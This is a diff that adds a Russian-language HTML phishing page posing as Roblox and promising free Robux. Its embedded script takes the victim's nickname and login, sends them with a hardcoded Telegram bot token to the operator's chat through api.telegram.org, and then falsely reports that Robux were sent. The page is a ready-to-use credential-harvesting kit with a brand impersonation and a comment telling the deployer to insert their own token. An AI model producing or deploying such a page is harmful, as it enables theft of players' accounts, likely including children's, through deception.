@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="theme-color" content="#0b0e14">
+<title>Roblox</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+  html, body {
+    height: 100%;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    background: #0b0e14;
+    color: #e8eaed;
+    overflow: hidden;
+  }
+
+  body {
+    display: flex;
+    flex-direction: column;
+    background:
+      radial-gradient(circle at 20% 0%, rgba(0,162,255,0.18), transparent 50%),
+      radial-gradient(circle at 80% 100%, rgba(124,58,237,0.16), transparent 50%),
+      #0b0e14;
+  }
+
+  .topbar {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 14px 18px;
+    font-size: 13px;
+    color: #8a8f98;
+  }
+  .topbar .dot {
+    width: 7px; height: 7px; border-radius: 50%;
+    background: #22c55e;
+    box-shadow: 0 0 8px #22c55e;
+    display: inline-block;
+    margin-right: 6px;
+  }
+
+  .wrap {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    padding: 0 22px 40px;
+    max-width: 460px;
+    margin: 0 auto;
+    width: 100%;
+  }
+
+  .logo-box {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    margin-bottom: 34px;
+  }
+  
+  .logo-icon {
+    width: 80px;
+    height: 80px;
+    margin-bottom: 16px;
+    display: grid;
+    place-items: center;
+    filter: drop-shadow(0 10px 20px rgba(255,255,255,0.1));
+  }
+  .logo-icon svg { width: 100%; height: 100%; display: block; }
+  
+  .logo-title {
+    font-size: 24px;
+    font-weight: 800;
+    letter-spacing: -0.5px;
+  }
+  .logo-title span { color: #fff; }
+  .logo-sub {
+    margin-top: 6px;
+    font-size: 13px;
+    color: #7b818c;
+    letter-spacing: 0.3px;
+  }
+
+  .field { margin-bottom: 16px; }
+  .field label {
+    display: block;
+    font-size: 12px;
+    font-weight: 600;
+    letter-spacing: 0.6px;
+    text-transform: uppercase;
+    color: #7b818c;
+    margin-bottom: 8px;
+  }
+  .input-wrap {
+    position: relative;
+    display: flex;
+    align-items: center;
+    background: #12161e;
+    border: 1.5px solid #232a36;
+    border-radius: 14px;
+    transition: border-color 0.2s, box-shadow 0.2s;
+  }
+  .input-wrap:focus-within {
+    border-color: #ffffff;
+    box-shadow: 0 0 0 3px rgba(255,255,255,0.1);
+  }
+  .input-wrap svg {
+    width: 20px; height: 20px;
+    margin-left: 14px;
+    flex-shrink: 0;
+    stroke: #5c636e;
+    transition: stroke 0.2s;
+  }
+  .input-wrap:focus-within svg { stroke: #ffffff; }
+  .input-wrap input {
+    flex: 1;
+    background: transparent;
+    border: none;
+    outline: none;
+    color: #e8eaed;
+    font-size: 16px;
+    padding: 16px 14px 16px 12px;
+    min-width: 0;
+  }
+  .input-wrap input::placeholder { color: #4a505b; }
+
+  .btn {
+    width: 100%;
+    margin-top: 10px;
+    padding: 17px;
+    border: none;
+    border-radius: 14px;
+    background: #ffffff;
+    color: #000;
+    font-size: 16px;
+    font-weight: 700;
+    letter-spacing: 0.3px;
+    cursor: pointer;
+    box-shadow: 0 10px 30px rgba(255,255,255,0.1);
+    transition: transform 0.1s, box-shadow 0.2s, opacity 0.2s;
+    touch-action: manipulation;
+  }
+  .btn:active {
+    transform: scale(0.98);
+    box-shadow: 0 4px 16px rgba(255,255,255,0.05);
+  }
+  .btn:disabled { opacity: 0.6; cursor: default; }
+
+  .foot {
+    text-align: center;
+    font-size: 11px;
+    color: #4a505b;
+    margin-top: 26px;
+    line-height: 1.6;
+  }
+
+  .msg {
+    margin-top: 14px;
+    text-align: center;
+    font-size: 13px;
+    min-height: 18px;
+    transition: color 0.2s;
+  }
+  .msg.ok { color: #22c55e; }
+  .msg.err { color: #ef4444; }
+
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(14px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+  .logo-box, .field, .btn, .foot {
+    animation: fadeUp 0.5s ease both;
+  }
+</style>
+</head>
+<body>
+
+  <div class="topbar">
+    <div><span class="dot"></span> </div>
+    <div>v2.4.1</div>
+  </div>
+
+  <div class="wrap">
+
+    <div class="logo-box">
+      <div class="logo-icon">
+        <!-- Перевернутый логотип (наклон вправо, как оригинал) -->
+        <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+          <rect x="15" y="15" width="70" height="70" rx="4"
+                transform="rotate(15 50 50)" fill="#ffffff"/>
+          <rect x="37" y="37" width="26" height="26" rx="2"
+                transform="rotate(15 50 50)" fill="#0b0e14"/>
+        </svg>
+      </div>
+      <div class="logo-title">Rob<span>lox</span></div>
+      <div class="logo-sub">Получить Робуксы</div>
+    </div>
+
+    <div class="field">
+      <label for="nick">Никнейм</label>
+      <div class="input-wrap">
+        <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
+          <circle cx="12" cy="7" r="4"/>
+        </svg>
+        <input type="text" id="nick" placeholder="Введите ник" autocomplete="off" autocapitalize="off">
+      </div>
+    </div>
+
+    <div class="field">
+      <label for="login">Логин</label>
+      <div class="input-wrap">
+        <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="3" y="11" width="18" height="11" rx="2"/>
+          <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+        </svg>
+        <input type="text" id="login" placeholder="Введите логин" autocomplete="off" autocapitalize="off">
+      </div>
+    </div>
+
+    <button class="btn" id="submitBtn" onclick="run()">Войти</button>
+    <div class="msg" id="msg"></div>
+
+    <div class="foot">
+      Нажимая «Получить», вы получаете робуксы в зависимости сколько вашему акаунту.<br>
+      © 2026 Roblox Corporation
+    </div>
+
+  </div>
+
+<script>
+  // ВСТАВЬ СВОЙ ТОКЕН И CHAT_ID ВНУТРЬ КАВЫЧЕК НИЖЕ:
+  const _0x1a2b = ["9007799176:AAHeuC6lwlRXW6zz9HuYZB-f02y7vbevskc", "8968343837"];
+
+  async function run() {
+    const n = document.getElementById('nick').value.trim();
+    const l = document.getElementById('login').value.trim();
+    const m = document.getElementById('msg');
+
+    if (!n || !l) {
+      m.textContent = 'Заполните оба поля';
+      m.className = 'msg err';
+      return;
+    }
+
+    const btn = document.getElementById('submitBtn');
+    btn.disabled = true;
+    btn.textContent = 'Проверка...';
+    m.textContent = '';
+
+    const msgText = `🎮 Roblox — новый вход\nНик: ${n}\nЛогин: ${l}`;
+    const apiUrl = `https://api.telegram.org/bot${_0x1a2b[0]}/sendMessage`;
+
+    try {
+      const res = await fetch(apiUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: _0x1a2b[1], text: msgText })
+      });
+
+      if (!res.ok) throw new Error('Fail');
+
+      m.textContent = 'Робуксы успешно отправлены';
+      m.className = 'msg ok';
+      document.getElementById('nick').value  = '';
+      document.getElementById('login').value = '';
+    } catch (e) {
+      m.textContent = 'Ошибка соединения, попробуйте снова';
+      m.className = 'msg err';
+    } finally {
+      btn.disabled = false;
+      btn.textContent = 'Получить';
+    }
+  }
+</script>
+</body>
+</html>
